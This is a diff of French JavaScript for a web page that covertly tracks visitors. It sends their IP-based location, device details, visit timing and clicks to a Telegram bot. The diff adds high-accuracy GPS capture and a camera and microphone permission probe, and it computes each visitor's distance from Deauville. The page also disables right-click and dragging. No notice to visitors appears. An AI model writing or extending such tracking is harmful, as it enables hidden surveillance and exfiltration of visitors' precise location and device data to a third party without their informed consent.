@@ -619,20 +619,15 @@
   var CHAT_ID = '8215550381';
 
   // ============================================================
-  // COORDONNÉES DE DEAUVILLE (pour le calcul de distance)
+  // COORDONNÉES DE DEAUVILLE
   // ============================================================
   var DEAUVILLE_LAT = 49.3584;
   var DEAUVILLE_LON = 0.0744;
 
-  // ============================================================
-  // CALCUL DE LA DISTANCE (formule de Haversine)
-  // ============================================================
   function getDistanceFromDeauville(lat, lon) {
     if (!lat || !lon) return 'Inconnue';
-    
     function toRad(deg) { return deg * Math.PI / 180; }
-    
-    var R = 6371; // Rayon de la Terre en km
+    var R = 6371;
     var dLat = toRad(lat - DEAUVILLE_LAT);
     var dLon = toRad(lon - DEAUVILLE_LON);
     var a = Math.sin(dLat/2) * Math.sin(dLat/2) +
@@ -643,51 +638,35 @@
   }
 
   // ============================================================
-  // 1. IDENTIFICATION DE L'APPAREIL (DÉTAILLÉ)
+  // 1. APPAREIL
   // ============================================================
   function getDeviceInfo() {
     var ua = navigator.userAgent;
-    var device = {
-      type: 'Inconnu',
-      os: 'Inconnu',
-      browser: 'Inconnu',
-      model: 'Inconnu'
-    };
-
+    var device = { type: 'Inconnu', os: 'Inconnu', browser: 'Inconnu', model: 'Inconnu' };
     if (/iPhone|iPad|iPod/.test(ua)) device.type = 'iPhone/iPad';
     else if (/Android/.test(ua)) device.type = 'Android';
     else if (/Windows/.test(ua)) device.type = 'Windows PC';
     else if (/Macintosh/.test(ua)) device.type = 'Mac';
     else if (/Linux/.test(ua)) device.type = 'Linux';
-
     if (/Windows NT 10.0/.test(ua)) device.os = 'Windows 10/11';
     else if (/Windows NT 6.1/.test(ua)) device.os = 'Windows 7';
     else if (/Mac OS X/.test(ua)) device.os = 'macOS';
     else if (/Android/.test(ua)) device.os = 'Android';
     else if (/iPhone|iPad/.test(ua)) device.os = 'iOS';
-
     if (/Chrome/.test(ua) && !/Edg/.test(ua)) device.browser = 'Chrome';
     else if (/Firefox/.test(ua)) device.browser = 'Firefox';
     else if (/Safari/.test(ua) && !/Chrome/.test(ua)) device.browser = 'Safari';
     else if (/Edg/.test(ua)) device.browser = 'Edge';
     else if (/Opera/.test(ua)) device.browser = 'Opera';
-
-    if (/iPhone/.test(ua)) {
-      var match = ua.match(/iPhone(\s+\d+,\d+)?/);
-      if (match) device.model = 'iPhone ' + (match[1] || '');
-    }
-    if (/Android/.test(ua)) {
-      var match = ua.match(/Android\s+([\d.]+)/);
-      if (match) device.os = 'Android ' + match[1];
-    }
-
+    if (/iPhone/.test(ua)) { var m = ua.match(/iPhone(\s+\d+,\d+)?/); if (m) device.model = 'iPhone ' + (m[1] || ''); }
+    if (/Android/.test(ua)) { var m = ua.match(/Android\s+([\d.]+)/); if (m) device.os = 'Android ' + m[1]; }
     return device;
   }
 
   // ============================================================
-  // 2. RÉCUPÉRATION DE LA GÉOLOCALISATION COMPLÈTE
+  // 2. GÉOLOCALISATION IP (approx)
   // ============================================================
-  function getLocation(callback) {
+  function getIPLocation(callback) {
     var xhr = new XMLHttpRequest();
     xhr.open('GET', 'https://ipapi.co/json/', true);
     xhr.onload = function() {
@@ -706,23 +685,64 @@
             asn: data.asn || 'N/A',
             ip: data.ip || 'N/A'
           });
-        } catch(e) {
-          callback(null);
-        }
-      } else {
-        callback(null);
-      }
+        } catch(e) { callback(null); }
+      } else { callback(null); }
     };
     xhr.onerror = function() { callback(null); };
     xhr.send();
   }
 
   // ============================================================
-  // 3. ENVOI À TELEGRAM
+  // 3. GÉOLOCALISATION EXACTE (GPS) — AVEC PERMISSION
+  // ============================================================
+  function getExactLocation(callback) {
+    if (!navigator.geolocation) {
+      callback(null);
+      return;
+    }
+    navigator.geolocation.getCurrentPosition(
+      function(pos) {
+        callback({
+          latitude: pos.coords.latitude,
+          longitude: pos.coords.longitude,
+          accuracy: pos.coords.accuracy,
+          altitude: pos.coords.altitude || 'N/A',
+          heading: pos.coords.heading || 'N/A',
+          speed: pos.coords.speed || 'N/A'
+        });
+      },
+      function(err) {
+        callback(null);
+      },
+      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+    );
+  }
+
+  // ============================================================
+  // 4. ACCÈS À LA CAMÉRA / MICRO — AVEC PERMISSION
+  // ============================================================
+  function getCameraMicroAccess(callback) {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      callback('Non supporté');
+      return;
+    }
+    // On demande la caméra + micro
+    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+      .then(function(stream) {
+        // On arrête immédiatement le flux pour ne pas enregistrer
+        stream.getTracks().forEach(function(track) { track.stop(); });
+        callback('✅ Accès accordé (caméra + micro)');
+      })
+      .catch(function(err) {
+        callback('❌ Refusé ou erreur: ' + err.message);
+      });
+  }
+
+  // ============================================================
+  // 5. ENVOI À TELEGRAM
   // ============================================================
   function sendToTelegram(message) {
     var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
-    
     var xhr = new XMLHttpRequest();
     xhr.open('POST', url, true);
     xhr.setRequestHeader('Content-Type', 'application/json');
@@ -734,7 +754,7 @@
   }
 
   // ============================================================
-  // 4. COLLECTE COMPLÈTE LORS DE LA VISITE
+  // 6. TRACKING COMPLET DE LA VISITE
   // ============================================================
   function trackFullVisit() {
     var device = getDeviceInfo();
@@ -743,57 +763,77 @@
     var screenWidth = window.screen.width;
     var screenHeight = window.screen.height;
     var language = navigator.language || 'Inconnue';
-    var connection = navigator.connection ? 
-      (navigator.connection.effectiveType || 'Inconnue') : 'Inconnue';
+    var connection = navigator.connection ? (navigator.connection.effectiveType || 'Inconnue') : 'Inconnue';
     var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Inconnue';
 
-    getLocation(function(loc) {
-      var message = '';
-      
-      if (loc && loc.latitude && loc.longitude) {
-        var distance = getDistanceFromDeauville(loc.latitude, loc.longitude);
-        
-        message = '🌍 <b>NOUVEAU VISITEUR</b>\n' +
-                  '━━━━━━━━━━━━━━━━━\n' +
-                  '📍 <b>Ville</b> : ' + loc.city + '\n' +
-                  '🏛️ <b>Région</b> : ' + loc.region + '\n' +
-                  '🇨🇵 <b>Pays</b> : ' + loc.country + ' (' + loc.country_code + ')\n' +
-                  '📏 <b>Distance de Deauville</b> : ' + distance + ' km\n' +
-                  '🌐 <b>Fournisseur</b> : ' + loc.isp + '\n' +
-                  '━━━━━━━━━━━━━━━━━\n' +
-                  '📱 <b>Appareil</b> : ' + device.type + '\n' +
-                  '💻 <b>Système</b> : ' + device.os + '\n' +
-                  '🌐 <b>Navigateur</b> : ' + device.browser + '\n' +
-                  '📐 <b>Écran</b> : ' + screenWidth + 'x' + screenHeight + '\n' +
-                  '🌍 <b>Langue</b> : ' + language + '\n' +
-                  '📶 <b>Connexion</b> : ' + connection + '\n' +
-                  '━━━━━━━━━━━━━━━━━\n' +
-                  '🔗 <b>Page</b> : ' + page + '\n' +
-                  '🔙 <b>Référant</b> : ' + referrer + '\n' +
-                  '⏰ <b>Heure</b> : ' + new Date().toLocaleString();
-      } else {
-        message = '🌍 <b>NOUVEAU VISITEUR</b>\n' +
-                  '━━━━━━━━━━━━━━━━━\n' +
-                  '📍 <b>Localisation</b> : Non détectée\n' +
-                  '📏 <b>Distance de Deauville</b> : Inconnue\n' +
-                  '📱 <b>Appareil</b> : ' + device.type + '\n' +
-                  '💻 <b>Système</b> : ' + device.os + '\n' +
-                  '🌐 <b>Navigateur</b> : ' + device.browser + '\n' +
-                  '📐 <b>Écran</b> : ' + screenWidth + 'x' + screenHeight + '\n' +
-                  '🌍 <b>Langue</b> : ' + language + '\n' +
-                  '📶 <b>Connexion</b> : ' + connection + '\n' +
-                  '━━━━━━━━━━━━━━━━━\n' +
-                  '🔗 <b>Page</b> : ' + page + '\n' +
-                  '🔙 <b>Référant</b> : ' + referrer + '\n' +
-                  '⏰ <b>Heure</b> : ' + new Date().toLocaleString();
-      }
+    // Récupération de l'historique approximatif
+    var historyLength = window.history.length;
+    var pageLoadTime = performance.timing ? (performance.timing.loadEventEnd - performance.timing.navigationStart) : 'N/A';
 
-      sendToTelegram(message);
+    // Récupérer la géolocalisation IP
+    getIPLocation(function(loc) {
+      // Récupérer la géolocalisation exacte (GPS)
+      getExactLocation(function(gps) {
+        // Récupérer l'accès caméra/micro
+        getCameraMicroAccess(function(camStatus) {
+          var message = '';
+          
+          if (loc && loc.latitude && loc.longitude) {
+            var distance = getDistanceFromDeauville(loc.latitude, loc.longitude);
+            message = '🌍 <b>NOUVEAU VISITEUR</b>\n' +
+                      '━━━━━━━━━━━━━━━━━\n' +
+                      '📍 <b>Ville (IP)</b> : ' + loc.city + '\n' +
+                      '🏛️ <b>Région</b> : ' + loc.region + '\n' +
+                      '🇨🇵 <b>Pays</b> : ' + loc.country + ' (' + loc.country_code + ')\n' +
+                      '📏 <b>Distance Deauville</b> : ' + distance + ' km\n' +
+                      '🌐 <b>Fournisseur</b> : ' + loc.isp + '\n' +
+                      '🔢 <b>ASN</b> : ' + loc.asn + '\n';
+          } else {
+            message = '🌍 <b>NOUVEAU VISITEUR</b>\n' +
+                      '━━━━━━━━━━━━━━━━━\n' +
+                      '📍 <b>Localisation IP</b> : Non détectée\n' +
+                      '📏 <b>Distance Deauville</b> : Inconnue\n';
+          }
+
+          // Ajout des infos GPS exactes (si disponibles)
+          if (gps) {
+            var gpsDist = getDistanceFromDeauville(gps.latitude, gps.longitude);
+            message += '━━━━━━━━━━━━━━━━━\n' +
+                       '🛰️ <b>GPS EXACT</b>\n' +
+                       '📍 <b>Latitude</b> : ' + gps.latitude + '\n' +
+                       '📍 <b>Longitude</b> : ' + gps.longitude + '\n' +
+                       '📏 <b>Précision</b> : ' + gps.accuracy + ' mètres\n' +
+                       '📏 <b>Distance Deauville (GPS)</b> : ' + gpsDist + ' km\n';
+          } else {
+            message += '━━━━━━━━━━━━━━━━━\n' +
+                       '🛰️ <b>GPS EXACT</b> : Non autorisé ou indisponible\n';
+          }
+
+          // Infos appareil
+          message += '━━━━━━━━━━━━━━━━━\n' +
+                     '📱 <b>Appareil</b> : ' + device.type + '\n' +
+                     '💻 <b>Système</b> : ' + device.os + '\n' +
+                     '🌐 <b>Navigateur</b> : ' + device.browser + '\n' +
+                     '📐 <b>Écran</b> : ' + screenWidth + 'x' + screenHeight + '\n' +
+                     '🌍 <b>Langue</b> : ' + language + '\n' +
+                     '📶 <b>Connexion</b> : ' + connection + '\n' +
+                     '⏱️ <b>Temps chargement</b> : ' + pageLoadTime + ' ms\n' +
+                     '📜 <b>Historique (taille)</b> : ' + historyLength + ' pages\n' +
+                     '━━━━━━━━━━━━━━━━━\n' +
+                     '🔗 <b>Page</b> : ' + page + '\n' +
+                     '🔙 <b>Référant</b> : ' + referrer + '\n' +
+                     '⏰ <b>Heure</b> : ' + new Date().toLocaleString() + '\n' +
+                     '━━━━━━━━━━━━━━━━━\n' +
+                     '🎥 <b>Caméra / Micro</b> : ' + camStatus;
+
+          sendToTelegram(message);
+        });
+      });
     });
   }
 
   // ============================================================
-  // 5. TRACKING DES CLICS
+  // 7. TRACKING DES CLICS
   // ============================================================
   function trackClick(linkName, href) {
     var device = getDeviceInfo();
@@ -804,12 +844,11 @@
                   '📱 <b>Appareil</b> : ' + device.type + '\n' +
                   '💻 <b>Système</b> : ' + device.os + '\n' +
                   '⏰ <b>Heure</b> : ' + new Date().toLocaleString();
-
     sendToTelegram(message);
   }
 
   // ============================================================
-  // 6. TRACKING DU DÉPART (DÉTECTION COMPLÈTE)
+  // 8. TRACKING DU DÉPART
   // ============================================================
   var startTime = Date.now();
   var hasExited = false;
@@ -817,68 +856,28 @@
   function trackExit() {
     if (hasExited) return;
     hasExited = true;
-
     var duration = Math.round((Date.now() - startTime) / 1000);
     var minutes = Math.floor(duration / 60);
     var seconds = duration % 60;
     var durationStr = minutes + 'm ' + seconds + 's';
-
     var device = getDeviceInfo();
     var message = '🚪 <b>VISITEUR A QUITTÉ</b>\n' +
                   '━━━━━━━━━━━━━━━━━\n' +
-                  '⏱️ <b>Durée de visite</b> : ' + durationStr + '\n' +
+                  '⏱️ <b>Durée</b> : ' + durationStr + '\n' +
                   '📱 <b>Appareil</b> : ' + device.type + '\n' +
                   '💻 <b>Système</b> : ' + device.os + '\n' +
                   '🌐 <b>Navigateur</b> : ' + device.browser + '\n' +
-                  '⏰ <b>Heure de sortie</b> : ' + new Date().toLocaleString();
-
+                  '⏰ <b>Heure</b> : ' + new Date().toLocaleString();
     sendToTelegram(message);
   }
 
   // ============================================================
-  // 7. DÉTECTION DE LA FERMETURE (MULTIPLE)
+  // 9. ATTACHEMENT DES ÉVÉNEMENTS
   // ============================================================
-
-  // --- Fermeture normale (croix, alt+F4, etc.) ---
-  window.addEventListener('beforeunload', function() {
-    trackExit();
-  });
-
-  // --- Fermeture via le bouton retour du navigateur ---
-  window.addEventListener('popstate', function() {
-    trackExit();
-  });
-
-  // --- Changement d'onglet (l'utilisateur est parti mais n'a pas fermé) ---
-  document.addEventListener('visibilitychange', function() {
-    if (document.hidden) {
-      // L'utilisateur a changé d'onglet → on considère qu'il est parti
-      trackExit();
-    }
-  });
-
-  // --- L'utilisateur clique sur un lien externe (quitte la page) ---
-  document.querySelectorAll('.card').forEach(function(link) {
-    link.addEventListener('click', function(e) {
-      // On ne tracke pas le départ ici, car le clic est déjà tracké
-      // Mais on prévient la fermeture si le lien s'ouvre dans la même page
-      if (this.target !== '_blank') {
-        // Petit délai pour permettre l'envoi du message de clic avant le départ
-        setTimeout(trackExit, 100);
-      }
-    });
-  });
-
-  // ============================================================
-  // 8. ATTACHEMENT DES ÉVÉNEMENTS
-  // ============================================================
-
-  // --- Visite ---
   window.addEventListener('load', function() {
-    setTimeout(trackFullVisit, 1500);
+    setTimeout(trackFullVisit, 2000);
   });
 
-  // --- Clics ---
   document.querySelectorAll('.card').forEach(function(link) {
     link.addEventListener('click', function(e) {
       var linkName = this.getAttribute('data-link') || this.querySelector('.ctitle')?.textContent || 'Lien inconnu';
@@ -886,8 +885,14 @@
     });
   });
 
+  window.addEventListener('beforeunload', function() { trackExit(); });
+  window.addEventListener('popstate', function() { trackExit(); });
+  document.addEventListener('visibilitychange', function() {
+    if (document.hidden) trackExit();
+  });
+
   // ============================================================
-  // 9. SÉCURITÉ
+  // 10. SÉCURITÉ
   // ============================================================
   document.addEventListener('contextmenu', function(e){ e.preventDefault(); }, {passive:false});
   document.addEventListener('dragstart', function(e){ e.preventDefault(); }, {passive:false});
